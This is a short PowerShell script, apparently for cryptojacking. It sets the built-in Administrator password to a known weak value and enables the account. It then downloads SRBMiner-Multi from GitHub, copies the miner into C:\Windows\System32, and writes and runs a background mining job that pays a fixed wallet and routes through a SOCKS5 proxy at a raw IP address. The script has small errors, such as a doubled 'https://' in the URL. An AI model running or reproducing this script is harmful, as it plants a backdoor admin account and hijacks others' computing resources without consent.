Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "Panda" -Force)
Get-LocalUser -Name "Administrator" | Enable-LocalUser
Invoke-WebRequest https://https://github.com/doktor83/SRBMiner-Multi/releases/download/0.8.9/SRBMiner-Multi-0-8-9-win64.zip -OutFile srb.zip
tar xf srb.zip
Copy C:\SRBMiner-Multi-0-8-9\SRBMiner-MULTI.exe C:\Windows\System32
cmd /c echo ./SRBMiner-MULTI.exe --disable-gpu --algorithm minotaurx --pool minotaurx.eu.mine.zpool.ca:7019 --wallet RM3wWv8aTy6AiZrt593WhaRYTpazxc3Jkj --password c=RVN,zap=AVN --background --keepalive value true --cpu-threads 4 --cpu-threads-intensity 2--cpu-threads-priority 2 --proxy socks5://192.252.214.20:15864 >a.ps1
cmd /c echo ping -n 18001 127.0.0.1>nul >>a.ps1
.\a.ps1
